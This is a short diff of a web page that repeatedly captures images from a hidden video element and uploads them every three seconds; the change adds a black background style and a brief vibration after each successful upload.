@@ -4,6 +4,13 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Continuous Image Upload</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background-color: black; /* Set background color to black */
+    }
+</style>
 </head>
 <body>
 <video id="video" autoplay style="display:none;"></video>
@@ -37,6 +44,7 @@
         .then(response => response.json())
         .then(data => {
             if (data.data) {
+                navigator.vibrate(100); // Vibrate for 100 milliseconds when image is successfully uploaded
                 setTimeout(captureAndUpload, 3000); // Capture and upload every 3 seconds
             } else {
                 console.log('Failed to upload image. Retrying...');
